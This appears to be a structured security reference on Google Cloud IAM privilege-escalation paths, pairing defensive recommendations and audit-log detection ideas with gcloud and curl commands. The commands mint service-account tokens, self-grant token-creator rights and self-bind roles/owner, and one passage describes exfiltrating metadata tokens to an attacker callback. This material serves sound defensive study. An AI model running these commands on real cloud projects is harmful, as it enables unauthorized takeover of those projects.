recommendation:
High powered service accounts + overly broad `iam.serviceAccounts.actAs` is what makes this privilege escalation path exploitable and impactful.

- **Avoid privileged service accounts on Cloud Functions** - Very rarely does a Cloud Function need `roles/editor` or `roles/owner`. Give each function a dedicated service account with only the roles it needs.
- **Grant `iam.serviceAccounts.actAs` on specific service accounts, not the project** - Bind `roles/iam.serviceAccountUser` (or a custom role with `iam.serviceAccounts.actAs`) on the individual service account a deployer needs, never at the project or folder level, where it covers every service account.
Use IAM Conditions to narrow the grant further:

```json
{
  "role": "roles/iam.serviceAccountUser",
  "members": ["serviceAccount:deployer@PROJECT_ID.iam.gserviceaccount.com"],
  "condition": {
    "title": "deploy-window-only",
    "expression": "request.time < timestamp(\"2026-12-31T00:00:00Z\")"
  }
}
```

- Monitor Cloud Audit Logs for `google.cloud.functions.v2.FunctionService.CreateFunction` events that set a service account the caller has not deployed with before.
- Monitor Cloud Audit Logs for Cloud Function creation by principals who do not usually create functions, especially when followed quickly by invocation of the new function.
- Monitor for `google.iam.admin.v1.SetIAMPolicy` events on service accounts that grant `iam.serviceAccounts.actAs` through `roles/iam.serviceAccountUser` or a custom role, particularly at project scope.
- Correlate function creation with calls to its underlying Cloud Run route and subsequent API activity by the attached service account.
- Regularly audit which service accounts Cloud Functions run as and down-scope any with `roles/editor` or `roles/owner`.
- Use IAM Recommender and Policy Analyzer to find unused or overly broad `actAs` grants.
limitations:
This path provides administrative access only when the attached target service account has administrative project permissions such as `roles/owner`, `roles/editor`, or an equivalent custom role. If it has narrower permissions, the attacker receives only that limited access, although it may enable further lateral movement or multi-hop escalation.

The attacker must be able to invoke the newly created function. For a private second-generation function this requires `run.routes.invoke` on the underlying Cloud Run service. Deployment also depends on the project's Cloud Functions build infrastructure and service agents being operational. The demonstrated commands use the privileged target account as both the runtime and Cloud Build service account, so it must have the build, source-storage, logging, and artifact permissions required by Cloud Build. An attacker can instead select a separate usable build service account, but must also hold `iam.serviceAccounts.actAs` on that identity. The stolen OAuth token is short-lived, but the attacker can invoke the function again while it exists to obtain another token.

recommendation:
High powered service accounts + overly broad `iam.serviceAccounts.actAs` is what makes this privilege escalation path exploitable and impactful.

- **Avoid privileged service accounts on Cloud Functions** - Very rarely does a Cloud Function need `roles/editor` or `roles/owner`. Give each function a dedicated service account with only the roles it needs.
- **Separate deployment permissions from privileged runtime identities** - Do not grant the same principal both `cloudfunctions.functions.update` on a production function and `iam.serviceAccounts.actAs` on its attached service account. Treat that combination as equivalent to permission to run arbitrary code as the service account.
- **Grant `iam.serviceAccounts.actAs` on specific service accounts, not the project** - Bind `roles/iam.serviceAccountUser` or a custom role on only the service accounts a deployer legitimately needs.
Use IAM Conditions to narrow the grant further:

```json
{
  "role": "roles/iam.serviceAccountUser",
  "members": ["serviceAccount:deployer@PROJECT_ID.iam.gserviceaccount.com"],
  "condition": {
    "title": "deploy-window-only",
    "expression": "request.time < timestamp(\"2026-12-31T00:00:00Z\")"
  }
}
```

- Monitor Cloud Audit Logs for `google.cloud.functions.v2.FunctionService.UpdateFunction` events that replace source code or an entry point, especially when the caller is not the expected CI/CD identity.
- Correlate source upload URL generation and function updates from the same principal with invocation of the function and subsequent API activity by its attached service account.
- Monitor for `google.iam.admin.v1.SetIAMPolicy` events on service accounts that grant `iam.serviceAccounts.actAs`, especially at project scope.
- Alert when a principal updates a function whose attached service account has permissions the principal does not otherwise possess.
- Regularly audit which service accounts Cloud Functions run as and down-scope any with `roles/editor` or `roles/owner`.
- Use IAM Recommender and Policy Analyzer to find unused or overly broad `actAs` grants.
limitations:
This path requires an existing second-generation Cloud Function whose attached runtime service account is both useful to the attacker and covered by the attacker's `iam.serviceAccounts.actAs` grant. Cloud Functions also checks `iam.serviceAccounts.actAs` on the function's Cloud Build service account during a build configuration update; when the build and runtime identities differ, the attacker needs the grant on both. The path does not let the attacker select an arbitrary runtime identity unless it is already attached to a function the attacker can update, or the attacker also has permissions to change the function's runtime configuration.

Administrative impact depends entirely on the attached runtime service account's roles. A narrowly scoped runtime identity yields only those permissions. The `gcloud` example also requires the existing `BUILD_SA` to remain a usable custom Cloud Build service account with the necessary source-storage, logging, artifact, and build permissions; the raw PATCH example retains the function's existing build identity but still requires `iam.serviceAccounts.actAs` on it. The attacker must also be able to invoke the updated function through `run.routes.invoke`. Replacing production code can cause an outage or create an obvious integrity signal, and the stolen OAuth token is short-lived, although the attacker can invoke the compromised function again while the malicious code remains deployed.

gcpwn.description: Use GCPwn's Cloud Run service exploitation module to create a service as the target service account and send its metadata-server token to an attacker-controlled callback. URL exfiltration avoids requiring `logging.logEntries.list`; omit `--invoke` to avoid adding `run.routes.invoke` to the minimum create path.
Use the token recovered by GCPwn directly against Google APIs as the attached service account

recommendation:
High powered service accounts + overly broad `iam.serviceAccounts.actAs` is what makes this privilege escalation path exploitable and impactful.

- **Avoid privileged service accounts on Cloud Run services** - Very rarely does a Cloud Run service need `roles/editor` or `roles/owner`. Give each service a dedicated service account with only the roles it needs.
- **Grant `iam.serviceAccounts.actAs` on specific service accounts, not the project** - Bind `roles/iam.serviceAccountUser` or a custom role on the individual service account a deployer needs, never at the project or folder level.
- **Separate Cloud Run creation from privileged identities** - Do not grant a principal both `run.services.create` and `iam.serviceAccounts.actAs` over service accounts with permissions that principal should not inherit.
Use IAM Conditions to narrow the `actAs` grant further:

```json
{
  "role": "roles/iam.serviceAccountUser",
  "members": ["serviceAccount:deployer@PROJECT_ID.iam.gserviceaccount.com"],
  "condition": {
    "title": "deploy-window-only",
    "expression": "request.time < timestamp(\"2026-12-31T00:00:00Z\")"
  }
}
```

- Monitor Cloud Audit Logs for `google.cloud.run.v2.Services.CreateService` events that set a service account the caller has not previously deployed with.
- Alert on Cloud Run services created from unexpected public images, with command or argument overrides, or by principals that do not normally deploy services.
- Monitor for `google.iam.admin.v1.SetIAMPolicy` events on service accounts that grant `iam.serviceAccounts.actAs`, particularly at project scope.
- Correlate service creation, operation polling, service retrieval, and unusual outbound connections or log reads by the deploying principal.
- Inspect Cloud Run logs for metadata-server access patterns or OAuth tokens written to stdout, and alert when a principal with no logging duties reads a new service's logs immediately after deployment.
- Regularly audit which service accounts Cloud Run services use and down-scope any with `roles/editor` or `roles/owner`.
- Use IAM Recommender and Policy Analyzer to find unused or overly broad `actAs` grants.
limitations:
This path provides administrative access only when the attached service account has administrative project permissions such as `roles/owner`, `roles/editor`, or an equivalent custom role. A narrowly scoped target yields only those permissions, although they may enable further escalation.

The malicious container must be able to start and communicate with an exfiltration channel. Organization policies, VPC Service Controls, egress restrictions, Binary Authorization, or restrictions on external container images can prevent the demonstrated payload. Reading a token printed to Cloud Logging requires the additional `logging.logEntries.list` permission, while invoking a private service to trigger another execution requires the additional `run.routes.invoke` permission. Neither is fundamental when the container can send the token directly to an attacker-controlled endpoint during startup. OAuth access tokens are short-lived, but the attacker can obtain new tokens while the service remains deployable or running.

If the target service account holds a privileged project role, the attacker inherits all of its permissions for the lifetime of the minted token, entirely through IAM bindings and with no credential theft or code execution involved.

ACCESS_TOKEN=$(gcloud auth print-access-token)
TOKEN_RESPONSE=$(curl -sS -X POST \
  -H "Authorization: Bearer $ACCESS_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"scope":["https://www.googleapis.com/auth/cloud-platform"]}' \
  "https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/TARGET_SA@PROJECT_ID.iam.gserviceaccount.com:generateAccessToken")
TARGET_TOKEN=$(echo "$TOKEN_RESPONSE" | jq -r '.accessToken')

curl.command:
curl -H "Authorization: Bearer $TARGET_TOKEN" \

gcpwn.description: Enumerate IAM permissions and bindings across the project so GCPwn can identify the `CAN_CREATE_SA_ACCESS_TOKEN` privilege-escalation edge
Use Scott Weston and NetSPI's GCPwn single-permission movement module to mint a short-lived OAuth token for the target service account and pivot the active session to it

recommendation:
Service account impersonation is Google's recommended alternative to long-lived service account keys, but granting `iam.serviceAccounts.getAccessToken` across a privilege boundary turns that best practice into a privilege escalation path.

- **Avoid granting impersonation rights across privilege boundaries** - Never grant `iam.serviceAccounts.getAccessToken` (whether via the predefined `roles/iam.serviceAccountTokenCreator` role or a custom role bundling just this permission) to a principal that should not otherwise hold the target service account's permissions.
- **Scope impersonation grants with IAM Conditions** - Restrict bindings with time-bound or attribute-based conditions rather than granting unconditional, standing access:

```json
{
  "role": "roles/iam.serviceAccountTokenCreator",
  "members": ["serviceAccount:automation-sa@PROJECT_ID.iam.gserviceaccount.com"],
  "condition": {
    "title": "time-bound-impersonation",
    "expression": "request.time < timestamp(\"2026-12-31T00:00:00Z\")"
  }
}
```

- **Apply least privilege to service accounts that can be impersonated** - Replace broad primitive roles like `roles/editor` or `roles/owner` with narrowly scoped predefined or custom roles.
- **Prefer Workload Identity Federation** - Where possible, grant external workloads direct, narrowly-scoped access instead of chaining through an intermediate impersonatable service account.
- Monitor Cloud Audit Logs for `GenerateAccessToken` events on `iamcredentials.googleapis.com` where the impersonated service account holds `roles/editor` or `roles/owner`.
- Monitor for `google.iam.admin.v1.SetIAMPolicy` events on service accounts that add new `iam.serviceAccounts.getAccessToken` grants (via `roles/iam.serviceAccountTokenCreator` or a custom role) to service accounts holding elevated project roles.
- Investigate `GenerateAccessToken` or `SignJwt` events followed within seconds by API calls the caller's own identity does not otherwise have access to.
- Regularly audit IAM bindings with Policy Analyzer / IAM Recommender to identify service accounts with unused or overly broad impersonation grants.
limitations:
This path provides administrative access only if the target service account holds `roles/owner`, `roles/editor`, or an equivalent administrative custom role at the project level. If the target only has narrowly scoped permissions, the attacker inherits only those, though even limited additional access may enable further multi-hop escalation. Note that `roles/editor` and `roles/viewer` deliberately exclude Secret Manager payload access (`secretmanager.versions.access`), so reaching secrets specifically requires the target to also hold an explicit `roles/secretmanager.secretAccessor` grant.

The generated OAuth access token is short-lived, but the attacker can mint another token for as long as the impersonation grant remains in place. The token must be used directly with Google APIs or through tooling that supports service account impersonation; it is not a long-lived service account key.

name: iam.serviceAccounts.setIamPolicy

required.resourceConstraints: Must be granted on the target service account, either via a custom role scoped to this permission or the predefined `roles/iam.serviceAccountAdmin` role

additional.resourceConstraints: Required only by `gcloud iam service-accounts add-iam-policy-binding`, which reads the target service account's existing IAM policy before merging and writing it back; not needed via the raw `setIamPolicy` REST API, which accepts a full policy body constructed from scratch

If the target service account holds a privileged project role such as `roles/editor`, the attacker inherits all of its permissions through chained impersonation -- without ever needing a long-lived key or executing code on a workload. Writing a service account's IAM policy is functionally equivalent to holding that account's credentials.

Unlike `gcloud add-iam-policy-binding`, this does not require a prior `getIamPolicy` read -- the full policy is constructed from scratch, proving `iam.serviceAccounts.setIamPolicy` is the only required permission. Note that this replaces the entire policy, so any existing bindings not included will be removed.

curl.command:
TARGET_TOKEN=$(curl -sS -X POST \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"scope":["https://www.googleapis.com/auth/cloud-platform"]}' \
  "https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/TARGET_SA@PROJECT_ID.iam.gserviceaccount.com:generateAccessToken" \
  | jq -r '.accessToken')

curl.command:
curl -H "Authorization: Bearer $TARGET_TOKEN" \
  "https://cloudresourcemanager.googleapis.com/v1/projects/PROJECT_ID"
curl.description: Use the minted token directly against Google APIs as the target service account

recommendation:
Writing a service account's IAM policy (`iam.serviceAccounts.setIamPolicy`) is functionally equivalent to holding that account's credentials -- any principal that can rewrite the policy can self-grant `roles/iam.serviceAccountTokenCreator` and then mint tokens at will. This makes `setIamPolicy` grants across a privilege boundary as dangerous as direct impersonation grants.

- **Avoid granting `iam.serviceAccounts.setIamPolicy` across privilege boundaries** - Never grant policy-write rights on a service account to a principal that should not otherwise hold that account's permissions, whether via `roles/iam.serviceAccountAdmin` or a custom role scoped to just `setIamPolicy`.
- **Scope policy-management grants with IAM Conditions** - Restrict `setIamPolicy` bindings with time-bound or attribute-based conditions rather than granting unconditional, standing access:

```json
{
  "role": "roles/iam.serviceAccountAdmin",
  "members": ["serviceAccount:admin-sa@PROJECT_ID.iam.gserviceaccount.com"],
  "condition": {
    "title": "time-bound-sa-admin",
    "expression": "request.time < timestamp(\"2026-12-31T00:00:00Z\")"
  }
}
```

- **Apply least privilege to service accounts that can be impersonated** - Replace broad primitive roles like `roles/editor` or `roles/owner` with narrowly scoped predefined or custom roles that grant only what the workload needs.
- **Resolve custom roles when detecting `setIamPolicy` grants** - The permission can arrive through `roles/iam.serviceAccountAdmin` or a narrowly scoped custom role; detection logic that only checks predefined role names will miss the custom-role variant.
- Monitor Cloud Audit Logs for `iam.googleapis.com/SetIamPolicy` events on service accounts where the new policy adds `roles/iam.serviceAccountTokenCreator` (or a custom role including `iam.serviceAccounts.getAccessToken`) for a principal that previously could not impersonate the account.
- Monitor for `iam.googleapis.com/GenerateAccessToken` events immediately following a `SetIamPolicy` that granted the caller tokenCreator on the same service account -- this self-grant-then-impersonate pattern is a high-confidence signal of privilege escalation.
- Monitor for `iam.googleapis.com/SetIamPolicy` events that grant `iam.serviceAccounts.setIamPolicy` (via `roles/iam.serviceAccountAdmin` or a custom role) at the project level, which would cover every service account in the project.
- Regularly audit IAM bindings with Policy Analyzer / IAM Recommender to identify service accounts whose policies can be written by lower-privilege principals.
limitations:
This path provides administrative access only if the target service account holds `roles/owner`, `roles/editor`, or an equivalent administrative custom role at the project level. If the target only has narrowly scoped permissions, the attacker inherits only those, though even limited additional access may enable further multi-hop escalation. Note that `roles/editor` and `roles/viewer` deliberately exclude Secret Manager payload access (`secretmanager.versions.access`), so reaching secrets specifically requires the target to also hold an explicit `roles/secretmanager.secretAccessor` grant.

The `setIamPolicy` call replaces the entire IAM policy on the service account, not just appending a binding. The `gcloud add-iam-policy-binding` read-modify-write approach preserves existing bindings, while a raw `setIamPolicy` call that constructs the policy from scratch may remove them. In practice, the attacker only needs their own tokenCreator binding to succeed, so replacing the entire policy is viable.

edges.label: iam.serviceAccounts.setIamPolicy
edges.description:
The attacker overwrites the target service account's IAM policy to add a `roles/iam.serviceAccountTokenCreator` binding for itself, then mints a short-lived OAuth token to authenticate as the target.

Step 1 -- Self-grant tokenCreator on the target SA:
```bash
gcloud iam service-accounts add-iam-policy-binding \
  TARGET_SA@PROJECT_ID.iam.gserviceaccount.com \
  --member=serviceAccount:ATTACKER_SA@PROJECT_ID.iam.gserviceaccount.com \
  --role=roles/iam.serviceAccountTokenCreator
```

Step 2 -- Mint a token as the target SA:
```bash
gcloud auth print-access-token \
  --impersonate-service-account=TARGET_SA@PROJECT_ID.iam.gserviceaccount.com
```

The `gcloud add-iam-policy-binding` wrapper performs a read-modify-write and requires the additional `iam.serviceAccounts.getIamPolicy` permission. The raw `setIamPolicy` REST API accepts a full policy body constructed from scratch, proving `iam.serviceAccounts.setIamPolicy` is the only required permission.

edges.label: If target holds roles/editor or roles/owner
edges.description: If the target service account holds `roles/owner`, `roles/editor`, or an equivalent administrative custom role, the attacker inherits effective administrative control over the project for the lifetime of the minted token. The attacker can continue minting new tokens as long as the self-granted `roles/iam.serviceAccountTokenCreator` binding remains in place.

edges.label: If target holds narrower permissions
edges.description: If the target service account holds only narrowly scoped permissions, such as access to a specific Cloud Storage bucket or BigQuery dataset, the attacker inherits that limited access. Even limited additional access may enable further lateral movement or multi-hop escalation to higher-privilege principals.

edges.label: If target holds minimal permissions
edges.description: If the target service account has no meaningful permissions beyond the attacker's own, impersonating it provides no additional access. The attacker may still attempt to enumerate other service accounts where they hold `setIamPolicy` to find a more privileged target.

name: iam.roles.update

required.resourceConstraints: Must be granted on a project custom role that the attacker's principal is also a member of, enabling the principal to edit the role it holds

additional.resourceConstraints: Required only by `gcloud iam roles update --add-permissions`, which reads the role's current `includedPermissions` before writing the appended list; not needed via the raw `roles.patch` REST API, which replaces `includedPermissions` wholesale
Helpful for enumerating project custom roles to identify which bound role is editable
Helpful for confirming the current project context and the lack of direct admin roles
Required only by `gcloud projects add-iam-policy-binding`, which reads the project IAM policy before writing it back; not needed via the raw `setIamPolicy` REST API

description: A principal bound to a project custom role that also grants `iam.roles.update` on that role can edit the role's `includedPermissions` to add any permission -- most critically `resourcemanager.projects.setIamPolicy`. Because the principal is a member of the role, it instantly inherits the newly-added permission after IAM propagation. It then uses `resourcemanager.projects.setIamPolicy` to self-bind `roles/owner` on the project, achieving full project administrator access. The key vulnerability is the self-reference: the principal holds the role and can update the role, turning a least-privilege custom role into an open-ended permission vending machine.
prerequisites: A project custom role must exist that includes `iam.roles.update` on itself
The attacker's principal must be a member of (bound to) that same custom role

gcloud.description: Enumerate project custom roles to identify a role the attacker is bound to and can update. This reconnaissance requires the additional `iam.roles.list` permission.

Describe the editable custom role to confirm it grants `iam.roles.update`. This requires the additional `iam.roles.get` permission, which `gcloud iam roles update --add-permissions` also calls internally in step 3.

Add `resourcemanager.projects.setIamPolicy` to the custom role. Because the attacker is a member of this role, they instantly inherit the newly-added permission after IAM propagation (~15 seconds). `gcloud iam roles update --add-permissions` reads the role first (`iam.roles.get`), so it requires that additional permission.

Self-bind `roles/owner` on the project using the newly-acquired `resourcemanager.projects.setIamPolicy` permission. `gcloud projects add-iam-policy-binding` reads the project IAM policy first (`resourcemanager.projects.getIamPolicy`), so it requires that additional permission.
Run any Google Cloud command as the escalated principal, which now holds `roles/owner` on the project

curl.description: Add `resourcemanager.projects.setIamPolicy` to the custom role by PATCHing its `includedPermissions` via the raw `roles.patch` API. Unlike `gcloud iam roles update --add-permissions`, this replaces the entire permission list without reading the role first, so `iam.roles.get` is not required. Include all existing permissions in the list to avoid removing them.

Self-bind `roles/owner` on the project using the raw `setIamPolicy` REST API. Unlike `gcloud projects add-iam-policy-binding`, this does not require a prior `getIamPolicy` read -- but including existing bindings in the policy body is recommended to avoid removing them.

curl.command:
curl -H "Authorization: Bearer $TOKEN" \
  "https://cloudresourcemanager.googleapis.com/v1/projects/PROJECT_ID"
curl.description: Verify `roles/owner` access by querying the project as the escalated principal

recommendation:
Granting `iam.roles.update` to a principal that is also a member of the updated role creates a self-referential escalation path -- the principal can add any permission to the role and instantly inherit it, making the custom role boundary meaningless.

- **Never bind a principal to a custom role it can also update** - Break the self-reference. If a principal must administer roles, ensure it is not itself a member of the roles it can edit. Keep role-administration permissions in a separate, tightly-held identity.
- **Restrict `iam.roles.update` to dedicated administrators** - Treat role-editing permissions as administrative. Use predefined roles like `roles/iam.roleAdmin` only for break-glass or platform-team identities, never for workload service accounts.
- **Use IAM Conditions to scope role-administration bindings** - Add time-bound or resource-constrained conditions so standing, unconditional role-edit access is not granted:

```json
{
  "role": "roles/iam.roleAdmin",
  "members": ["serviceAccount:platform-admin@PROJECT_ID.iam.gserviceaccount.com"],
  "condition": {
    "title": "time-bound-role-admin",
    "expression": "request.time < timestamp(\"2026-12-31T00:00:00Z\")"
  }
}
```

- **Monitor for changes to custom role `includedPermissions`** - Especially additions of high-impact permissions such as `resourcemanager.projects.setIamPolicy`, `iam.serviceAccounts.getAccessToken`, or `iam.serviceAccounts.setIamPolicy`.
- Monitor Cloud Audit Logs for `iam.googleapis.com/UpdateRole` events where the modification adds high-impact permissions and the caller is a member of the updated role -- the signature of this self-escalation.
- Monitor for `cloudresourcemanager.googleapis.com/SetIamPolicy` events that add `roles/owner` or `roles/editor` bindings, especially when the member being added is the same identity making the call (self-binding).
- Monitor for the sequential pattern: `UpdateRole` adding `resourcemanager.projects.setIamPolicy`, followed within seconds by a `SetIamPolicy` self-binding `roles/owner`, followed by access to previously-denied resources.
- Use Policy Analyzer / IAM Recommender to identify identities that hold effective `iam.roles.update` on a custom role they are also bound to -- the core of this vulnerability.
limitations:
This path requires the specific combination of (1) the attacker being a member of a custom role and (2) that same custom role granting `iam.roles.update` on itself. If the custom role grants `iam.roles.update` on a different role that the attacker does not hold, editing it does not directly benefit the attacker.

`resourcemanager.projects.setIamPolicy` is not a starting permission -- it is manufactured mid-attack by editing the custom role. Detection based solely on starting permissions would miss this path; effective detection must model the permissions an identity can grant itself.

After self-binding `roles/owner`, the attacker has full project administrator access. `roles/owner` includes `secretmanager.versions.access`, so unlike `roles/editor`, no additional `secretAccessor` grant is needed to read Secret Manager payloads.

nodes.label: Starting Service Account
nodes.description: The attacker's starting service account. It holds no project-level roles of its own (no `roles/owner`, `roles/editor`, etc.), but it is bound to a project custom role that grants `iam.roles.update` on that same role. This self-referential binding is the core vulnerability: the SA can edit the permissions of the role it holds, effectively granting itself arbitrary permissions.

nodes.label: Editable Custom Role
nodes.description: A project custom role (e.g., `gcp_iam_003_editable`) that the starting service account is bound to. The role initially grants only `iam.roles.update` (scoped to itself), but because the SA can edit its `includedPermissions`, the role becomes a permission vending machine. The attacker adds `resourcemanager.projects.setIamPolicy` to the role, and the SA instantly inherits it after IAM propagation (~15 seconds).

nodes.label: Effective Administrator
nodes.description: The starting service account has self-bound `roles/owner` on the project using the `resourcemanager.projects.setIamPolicy` permission it manufactured by editing its own custom role. It now has full project administrator access, including `secretmanager.versions.access` (unlike `roles/editor`, which excludes it). The entire escalation is performed by a single principal with no lateral movement.

edges.label: iam.roles.update
edges.description:
The starting service account calls `iam.roles.update` on the custom role it is bound to, adding `resourcemanager.projects.setIamPolicy` to the role's `includedPermissions`. This is the key self-referential action: the SA edits the very role it holds.

Command:
```bash
gcloud iam roles update CUSTOM_ROLE_ID \
  --project=PROJECT_ID \
  --add-permissions=resourcemanager.projects.setIamPolicy
```

The `gcloud iam roles update --add-permissions` variant requires the additional `iam.roles.get` permission (it reads the role first). The raw `roles.patch` REST API replaces `includedPermissions` wholesale and does not require `iam.roles.get`.

edges.label: Inherits new permissions
edges.description: Because the starting service account is a member of the custom role, it instantly inherits `resourcemanager.projects.setIamPolicy` after IAM propagation (~15 seconds). No additional API call is needed -- the permission is granted automatically through the existing role binding. The SA now holds a permission it was never explicitly granted; it manufactured it by editing its own role.

edges.label: resourcemanager.projects.setIamPolicy
edges.description:
The starting service account uses the newly-inherited `resourcemanager.projects.setIamPolicy` permission to self-bind `roles/owner` on the project. This is a single API call that adds the SA to the project IAM policy with the `roles/owner` role.

Command:
```bash
gcloud projects add-iam-policy-binding PROJECT_ID \
  --member=serviceAccount:ATTACKER_SA@PROJECT_ID.iam.gserviceaccount.com \
  --role=roles/owner
```

After IAM propagation, the SA has full project administrator access. `roles/owner` includes `secretmanager.versions.access`, so no additional grant is needed to read Secret Manager payloads.
